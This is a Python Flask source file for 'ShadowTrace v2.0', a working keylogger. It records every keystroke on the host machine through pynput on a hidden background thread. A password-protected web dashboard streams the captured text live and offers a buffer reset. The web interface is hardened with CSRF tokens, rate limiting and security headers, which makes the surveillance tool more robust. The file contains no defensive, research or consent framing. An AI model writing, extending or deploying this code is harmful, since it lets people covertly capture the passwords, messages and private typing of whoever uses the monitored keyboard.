import os
import sys
import time
import html
import secrets
import logging
import threading
from datetime import datetime, timedelta
from functools import wraps
from dotenv import load_dotenv
from flask import (
    Flask, render_template_string, jsonify, request,
    session, redirect, url_for, abort, make_response
)
from pynput.keyboard import Key, Listener

import database

# Compatibility shim for Flask 2.x with Werkzeug 3.x+
import werkzeug
if not hasattr(werkzeug, '__version__'):
    import importlib.metadata
    try:
        werkzeug.__version__ = importlib.metadata.version('werkzeug')
    except Exception:
        werkzeug.__version__ = '3.1.3'

# Load environment configuration from .env
load_dotenv()

app = Flask(__name__)

# Security & Session Configuration
app.secret_key = os.getenv('SECRET_KEY')
if not app.secret_key:
    # If no secret key in environment, generate an ephemeral one and warn
    app.secret_key = secrets.token_hex(32)
    print("[SECURITY WARNING] SECRET_KEY not found in environment; generated dynamic key.")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=(os.getenv('SESSION_COOKIE_SECURE', 'False').lower() == 'true'),
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# Initialize Database with Admin Credentials
ADMIN_USER = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASS = os.getenv('ADMIN_PASSWORD')
init_pass = database.init_db(ADMIN_USER, ADMIN_PASS)
if init_pass:
    print(f"[SECURITY NOTICE] Initialized default admin credentials -> Username: {ADMIN_USER} | Password: {init_pass}")

# Keylogger State
log_storage = []
clean_text = ""
storage_lock = threading.Lock()

def on_press(key):
    """Sanitizes and captures keystrokes asynchronously."""
    global clean_text, log_storage
    
    try:
        raw_key_str = str(key).replace("'", "")
        # Sanitize any raw key string against XSS injection
        key_str = html.escape(raw_key_str)

        with storage_lock:
            if key == Key.space:
                clean_text += " "
                log_storage.append(" ")
            elif key == Key.enter:
                clean_text += "\n"
                log_storage.append("<br>[ENTER]<br>")
            elif key == Key.backspace:
                clean_text = clean_text[:-1]
                log_storage.append(" [⌫] ")
            elif "Key" in str(key):
                special_token = html.escape(str(key).split('.')[1].upper())
                log_storage.append(f" <span class='special'>[{special_token}]</span> ")
            else:
                clean_text += key_str
                log_storage.append(key_str)

            if len(log_storage) > 1000:
                log_storage.pop(0)
    except Exception as e:
        # Never crash keyboard listener thread
        pass

def start_keylogger():
    """Runs hardware key listener on dedicated thread."""
    with Listener(on_press=on_press) as listener:
        listener.join()

# ---------------------------------------------------------
# In-Memory IP Rate Limiter
# ---------------------------------------------------------
class RateLimiter:
    def __init__(self):
        self.requests = {}
        self.lock = threading.Lock()

    def is_allowed(self, ip, endpoint, max_requests, window_seconds):
        now = time.time()
        key = f"{ip}:{endpoint}"
        with self.lock:
            if key not in self.requests:
                self.requests[key] = []
            # Keep only timestamps within window
            self.requests[key] = [t for t in self.requests[key] if now - t < window_seconds]
            if len(self.requests[key]) >= max_requests:
                return False
            self.requests[key].append(now)
            return True

limiter = RateLimiter()

def get_client_ip():
    """Extracts client IP address securely."""
    return request.remote_addr or '127.0.0.1'

# ---------------------------------------------------------
# CSRF and Auth Decorators
# ---------------------------------------------------------
def get_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(24)
    return session['csrf_token']

def verify_csrf():
    token = request.headers.get('X-CSRF-Token') or request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        database.log_security_event("CSRF_REJECTED", get_client_ip(), f"Invalid CSRF token on {request.path}")
        return False
    return True

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            if request.path.startswith('/update') or request.path.startswith('/reset') or request.is_json:
                return jsonify({'error': 'Unauthorized', 'message': 'Authentication required'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ---------------------------------------------------------
# Security Headers & CORS Hooks
# ---------------------------------------------------------
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=(), payment=()'
    
    # Content Security Policy (strict self-origin)
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "form-action 'self';"
    )

    # Restrict CORS to configured origin
    origin = request.headers.get('Origin')
    allowed_origin = os.getenv('CORS_ORIGIN', 'http://127.0.0.1:5005')
    if origin and (origin == allowed_origin or allowed_origin == "*"):
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-CSRF-Token'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'

    return response

# ---------------------------------------------------------
# HTML Templates (Cyberpunk Aesthetics)
# ---------------------------------------------------------
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowTrace // Secure Login Gateway</title>
    <style>
        :root { --bg: #000000; --term: #00ff99; --dim: #003319; --accent: #00d4ff; --warn: #ff3366; }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg); color: var(--term);
            font-family: 'Courier New', monospace; margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .login-card {
            background: #050808; border: 1px solid var(--term);
            border-radius: 8px; width: 420px; max-width: 90vw; padding: 30px;
            box-shadow: 0 0 25px rgba(0, 255, 153, 0.2);
        }
        .title {
            text-align: center; font-size: 1.4rem; font-weight: bold;
            letter-spacing: 2px; margin-bottom: 5px; color: var(--term);
        }
        .subtitle {
            text-align: center; font-size: 0.8rem; color: #667766;
            margin-bottom: 25px; letter-spacing: 1px;
        }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 0.85rem; margin-bottom: 6px; letter-spacing: 1px; }
        input[type="text"], input[type="password"] {
            width: 100%; background: #001100; border: 1px solid #005522;
            color: #ffffff; padding: 12px; font-family: 'Courier New', monospace;
            font-size: 1rem; border-radius: 4px; outline: none; transition: border 0.3s;
        }
        input:focus { border-color: var(--term); box-shadow: 0 0 8px rgba(0, 255, 153, 0.4); }
        .btn-submit {
            width: 100%; background: transparent; color: var(--term);
            border: 1px solid var(--term); padding: 12px; font-family: 'Courier New', monospace;
            font-weight: bold; font-size: 1rem; letter-spacing: 1.5px; cursor: pointer;
            border-radius: 4px; transition: all 0.2s; margin-top: 10px;
        }
        .btn-submit:hover {
            background: var(--term); color: #000; box-shadow: 0 0 15px rgba(0, 255, 153, 0.6);
        }
        .alert-error {
            background: rgba(255, 51, 102, 0.1); border: 1px solid var(--warn);
            color: var(--warn); padding: 10px; border-radius: 4px; font-size: 0.85rem;
            margin-bottom: 20px; text-align: center;
        }
        .security-badge {
            margin-top: 25px; text-align: center; font-size: 0.75rem; color: #445544;
            border-top: 1px solid #002211; padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="title">⚡ SHADOWTRACE ⚡</div>
        <div class="subtitle">// ACCESS VERIFICATION GATEWAY //</div>

        {% if error %}
        <div class="alert-error">⚠️ {{ error }}</div>
        {% endif %}

        <form method="POST" action="{{ url_for('login') }}">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            <div class="form-group">
                <label for="username">OPERATOR ID</label>
                <input type="text" id="username" name="username" required autocomplete="off" autofocus maxlength="50">
            </div>
            <div class="form-group">
                <label for="password">SECURITY KEYPHRASE</label>
                <input type="password" id="password" name="password" required autocomplete="current-password" maxlength="100">
            </div>
            <button type="submit" class="btn-submit">AUTHENTICATE & ENTER</button>
        </form>

        <div class="security-badge">
            🔒 PROTECTED BY CSRF, RATE LIMITS & SCRYPT HASHING
        </div>
    </div>
</body>
</html>
"""

HUD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowTrace // Secure Live Monitor</title>
    <style>
        :root { --bg: #000000; --term: #0f0; --dim: #003300; --white: #fff; --accent: #00d4ff; --warn: #ff3366; }
        body {
            background-color: var(--bg); color: var(--term);
            font-family: 'Courier New', monospace; margin: 0; padding: 20px;
            overflow: hidden;
        }
        .header {
            border-bottom: 2px solid var(--term); padding-bottom: 10px;
            margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;
        }
        .status { animation: blink 1s infinite; color: red; font-weight: bold; }
        .operator-tag {
            color: var(--accent); font-size: 0.85rem; margin-right: 15px;
        }
        .btn-logout {
            color: #888; text-decoration: none; border: 1px solid #444;
            padding: 4px 10px; border-radius: 3px; font-size: 0.8rem; transition: all 0.2s;
        }
        .btn-logout:hover { color: var(--warn); border-color: var(--warn); }
        
        .container { display: flex; gap: 20px; height: 85vh; }
        
        .panel {
            border: 1px solid var(--dim); padding: 15px;
            background: #050505; border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        
        #live-feed {
            flex: 2; overflow-y: auto; font-size: 1.1rem;
            line-height: 1.5; white-space: pre-wrap; word-wrap: break-word;
        }
        
        .special { color: #008800; font-size: 0.8rem; }
        
        #stats-panel { flex: 1; display: flex; flex-direction: column; gap: 20px; }
        .stat-box { text-align: center; border: 1px solid var(--dim); padding: 20px; }
        .big-num { font-size: 3rem; font-weight: bold; color: var(--white); }

        .btn-reset {
            background: transparent;
            color: #ff4444;
            border: 1px solid #ff4444;
            padding: 12px 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
        }
        .btn-reset:hover {
            background: #ff4444;
            color: #000;
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
        }
        .btn-reset:active {
            transform: scale(0.98);
        }

        .alert-toast {
            display: none;
            color: #0f0;
            font-size: 0.85rem;
            margin-top: 10px;
            text-align: center;
        }
        
        @keyframes blink { 50% { opacity: 0; } }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #003300; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            SHADOW_TRACE v2.0 <span style="font-size:0.8rem; color:#666;">// PORT: {{ port }} [HARDENED]</span>
        </div>
        <div style="display: flex; align-items: center;">
            <span class="operator-tag">OPERATOR: [{{ user.username|upper }}]</span>
            <div class="status" style="margin-right: 15px;">● RECORDING LIVE</div>
            <a href="{{ url_for('logout') }}" class="btn-logout">LOGOUT</a>
        </div>
    </div>

    <div class="container">
        <div id="live-feed" class="panel"><span style="color:#666;">Waiting for secure input...</span></div>

        <div id="stats-panel">
            <div class="panel stat-box">
                <div class="label">TOTAL KEYSTROKES</div>
                <div id="count" class="big-num">0</div>
            </div>
            <div class="panel stat-box">
                <div class="label">PROTECTION PROFILE</div>
                <div style="color: var(--term); margin-top:10px; font-size:0.85rem; line-height:1.6;">
                    ✔ AUTHENTICATION: ACTIVE<br>
                    ✔ CSRF PROTECTION: ENFORCED<br>
                    ✔ XSS FILTERING: ENABLED<br>
                    ✔ RATE LIMITING: ACTIVE
                </div>
            </div>
            <div class="panel stat-box">
                <div class="label" style="margin-bottom: 12px;">BUFFER CONTROLS</div>
                <button id="reset-btn" class="btn-reset" onclick="resetLogs()">RESET BUFFER</button>
                <div id="reset-toast" class="alert-toast">✔ BUFFER PURGED (AUDITED)</div>
            </div>
        </div>
    </div>

    <script>
        const CSRF_TOKEN = "{{ csrf_token }}";
        let isResetting = false;

        function fetchLogs() {
            if (isResetting) return;
            fetch('/update', {
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (response.status === 401) {
                    window.location.href = '/login';
                    return null;
                }
                return response.json();
            })
            .then(data => {
                if (!data) return;
                const feed = document.getElementById('live-feed');
                if (data.logs && data.logs.length > 0) {
                    feed.innerHTML = data.logs.join('');
                } else {
                    feed.innerHTML = '<span style="color:#666;">Waiting for secure input...</span>';
                }
                feed.scrollTop = feed.scrollHeight;
                document.getElementById('count').innerText = data.count;
            })
            .catch(err => console.error('Secure fetch error:', err));
        }

        function resetLogs() {
            if (!confirm("Are you sure you want to securely purge the keystroke buffer?")) return;
            isResetting = true;
            fetch('/reset', { 
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': CSRF_TOKEN
                },
                body: JSON.stringify({ csrf_token: CSRF_TOKEN })
            })
            .then(response => {
                if (response.status === 401) {
                    window.location.href = '/login';
                    return null;
                }
                return response.json();
            })
            .then(data => {
                if (!data) return;
                document.getElementById('live-feed').innerHTML = '<span style="color:#666;">Waiting for secure input...</span>';
                document.getElementById('count').innerText = '0';
                const toast = document.getElementById('reset-toast');
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                    isResetting = false;
                }, 1200);
            })
            .catch(err => {
                console.error('Secure reset error:', err);
                isResetting = false;
            });
        }

        setInterval(fetchLogs, 500);
    </script>
</body>
</html>
"""

# ---------------------------------------------------------
# Application Routes
# ---------------------------------------------------------
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = get_client_ip()
    
    # Rate Limiting: Max 5 attempts per 60 seconds per IP
    if not limiter.is_allowed(client_ip, 'login', max_requests=5, window_seconds=60):
        database.log_security_event("LOGIN_RATE_LIMIT", client_ip, "Brute-force limit exceeded.")
        return render_template_string(
            LOGIN_TEMPLATE, 
            error="Too many failed attempts. Rate limit exceeded. Please wait 60 seconds.",
            csrf_token=get_csrf_token()
        ), 429

    error = None
    if request.method == 'POST':
        if not verify_csrf():
            return render_template_string(
                LOGIN_TEMPLATE, 
                error="Invalid or expired CSRF security token.", 
                csrf_token=get_csrf_token()
            ), 403

        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')

        if not username or not password or len(username) > 50 or len(password) > 128:
            error = "Invalid credentials format."
        else:
            user = database.verify_credentials(username, password)
            if user:
                # Regenerate session on login to prevent session fixation
                session.clear()
                session['user'] = {
                    'id': user['id'],
                    'username': user['username'],
                    'role': user['role']
                }
                session['csrf_token'] = secrets.token_hex(24)
                session.permanent = True
                database.log_security_event("LOGIN_SUCCESS", client_ip, f"User '{username}' logged in.")
                return redirect(url_for('index'))
            else:
                database.log_security_event("LOGIN_FAILURE", client_ip, f"Failed attempt for user '{username}'.")
                error = "Access Denied: Invalid credentials."

    return render_template_string(
        LOGIN_TEMPLATE,
        error=error,
        csrf_token=get_csrf_token()
    )

@app.route('/logout')
def logout():
    client_ip = get_client_ip()
    user = session.get('user', {}).get('username', 'unknown')
    session.clear()
    database.log_security_event("LOGOUT", client_ip, f"User '{user}' logged out.")
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    port = os.getenv('PORT', '5005')
    return render_template_string(
        HUD_TEMPLATE, 
        user=session['user'],
        port=port,
        csrf_token=get_csrf_token()
    )

@app.route('/update')
@login_required
def update():
    client_ip = get_client_ip()
    # Rate limiting: 120 updates per minute
    if not limiter.is_allowed(client_ip, 'update', max_requests=120, window_seconds=60):
        return jsonify({'error': 'Too many requests'}), 429

    with storage_lock:
        response_data = {
            'logs': list(log_storage),
            'count': len(log_storage)
        }
    
    response = make_response(jsonify(response_data))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route('/reset', methods=['POST'])
@login_required
def reset():
    client_ip = get_client_ip()
    
    # Rate limit: Max 10 resets per minute
    if not limiter.is_allowed(client_ip, 'reset', max_requests=10, window_seconds=60):
        return jsonify({'error': 'Rate limit exceeded on buffer reset'}), 429

    # Verify CSRF Token strictly
    if not verify_csrf():
        return jsonify({'error': 'Forbidden: Invalid CSRF token'}), 403

    global clean_text, log_storage
    with storage_lock:
        log_storage.clear()
        clean_text = ""

    database.log_security_event("BUFFER_RESET", client_ip, f"Buffer purged by '{session['user']['username']}'")
    return jsonify({
        'status': 'success',
        'logs': [],
        'count': 0
    })

# ---------------------------------------------------------
# Custom Error Handlers (No Stack Trace Leakage)
# ---------------------------------------------------------
@app.errorhandler(400)
def bad_request(e):
    return jsonify({'error': 'Bad Request', 'code': 400}), 400

@app.errorhandler(401)
def unauthorized(e):
    return jsonify({'error': 'Unauthorized', 'code': 401}), 401

@app.errorhandler(403)
def forbidden(e):
    return jsonify({'error': 'Forbidden', 'code': 403}), 403

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not Found', 'code': 404}), 404

@app.errorhandler(429)
def too_many_requests(e):
    return jsonify({'error': 'Too Many Requests', 'code': 429}), 429

@app.errorhandler(500)
def internal_error(e):
    return jsonify({'error': 'Internal Server Error', 'code': 500}), 500

# ---------------------------------------------------------
# Server Bootstrap
# ---------------------------------------------------------
if __name__ == '__main__':
    host = os.getenv('HOST', '127.0.0.1')
    try:
        port = int(os.getenv('PORT', 5005))
    except ValueError:
        port = 5005

    print("=============================================")
    print("      SHADOW_TRACE v2.0 // HARDENED          ")
    print(f"      Host Interface : {host}               ")
    print(f"      Port           : {port}               ")
    print("      Debug Mode     : DISABLED (Strict)    ")
    print("      Auth & CSRF    : ENFORCED             ")
    print("      XSS Protection : ACTIVE               ")
    print("=============================================")

    logger_thread = threading.Thread(target=start_keylogger)
    logger_thread.daemon = True 
    logger_thread.start()

    # Always enforce debug=False in production runtime
    app.run(host=host, port=port, debug=False)
